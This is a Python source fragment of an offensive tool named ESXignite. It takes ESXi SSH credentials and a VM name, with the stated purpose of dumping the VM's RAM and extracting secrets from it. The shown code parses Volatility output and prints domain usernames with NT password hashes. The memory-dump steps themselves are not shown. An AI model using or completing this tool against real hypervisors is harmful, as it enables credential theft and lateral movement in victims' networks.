import argparse
import random
import string, sys
import time, re

def banner():
  print("""
      (        )                                 
      )\ )  ( /(                         )       
 (   (()/(  )\()) (   (  (        (   ( /(   (   
 )\   /(_))((_)\  )\  )\))(  (    )\  )\()) ))\  
((_) (_))  __((_)((_)((_))\  )\ )((_)(_))/ /((_) 
| __|/ __| \ \/ / (_) (()(_)_(_/( (_)| |_ (_))   
| _| \__ \  >  <  | |/ _` || ' \))| ||  _|/ -_)  
|___||___/ /_/\_\ |_|\__, ||_||_| |_| \__|\___|  
                     |___/ 
  """)

def random_string(n):
  return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))

def argument_parser():
  parser = argparse.ArgumentParser(
    description="Create+extract the RAM of a running VM on an ESXi and extract it's secrets",
    usage='ESXignite.py [-h] -t hostname -u user -p password -v vm_name'
  )
  parser.add_argument("--target", "-t", action="store", dest="hostname", required=True, help="ESXi hostname/IP")
  parser.add_argument("--username", "-u", action="store", dest="username", required=True, help="Username for ESXi SSH authication")
  parser.add_argument("--password", "-p", action="store", dest="password", required=True, help="Password for ESXi SSH authentication")
  parser.add_argument("--virtual-machine", "-v", action="store", dest="vm_name", required=True, help="Virtual Machine name to dump secrets from")
  args = parser.parse_args()
  return args

def waiting(stdout):
  sys.stdout.flush()
  while not stdout.channel.exit_status_ready():
    time.sleep(1)
    sys.stdout.write('.')
    sys.stdout.flush()
  print()

def volatility_parse(output):
  for line in output:
    if re.search("kerberos|dpapi|Font Driver Host|Window Manager", line) == None:
      account = line.split()
      if len(account) == 5:
        domain, username, nt = account[1], account[2], account[3]
        print(f'[*] {domain}\\{username}:{nt}')